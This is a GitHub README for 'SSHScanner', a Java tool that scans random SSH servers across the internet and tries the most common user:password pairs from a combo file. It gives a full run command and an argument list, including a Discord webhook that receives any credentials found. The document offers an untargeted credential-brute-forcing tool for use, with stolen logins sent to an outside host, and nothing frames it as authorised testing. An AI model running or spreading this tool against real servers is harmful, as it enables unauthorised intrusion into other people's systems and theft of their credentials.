## Description
This tool scans random SSH servers around the world and it tests the most used passwords

## Developers

You can reuse SSHScanner but make sure you comply with the [LICENSE](https://github.com/thisisnzed/SSHScanner/blob/main/LICENSE).

### Maven

```xml
<dependencies>
    <dependency>
        <groupId>com.thisisnzed</groupId>
        <artifactId>SSHScanner</artifactId>
        <version>1.0-SNAPSHOT</version>
    </dependency>
</dependencies>
```

## Lib

* **JSch** : http://www.jcraft.com/jsch/ 

## Usage

* I. Download the [latest release](https://github.com/thisisnzed/SSHScanner/releases) of SSHScanner
* II. Run the program with **java -jar SSHScanner.jar -combo combo.txt -threads 1 -port 22 -timeout 6000 -webhook "https://discord.com/api/webhooks/x/y" -verbose true**

## Arguments

Note: Each argument is optional

* **-combo <path>** | File containing all the "user:password" that the program will test for each host (default: combo.txt)
* **-threads <int>** | Number of threads launched (default: 1)
* **-port <int>** | Port that will be tested for each host (default: 22)
* **-timeout <int>** | Time (in ms) before the program marks a server as unavailable (default: 6000)
* **-webhook <url>** | Discord webhook where credentials will be sent (default: "")
* **-verbose <boolean>** | Whether or not to display failed attempts on the console (default: true)




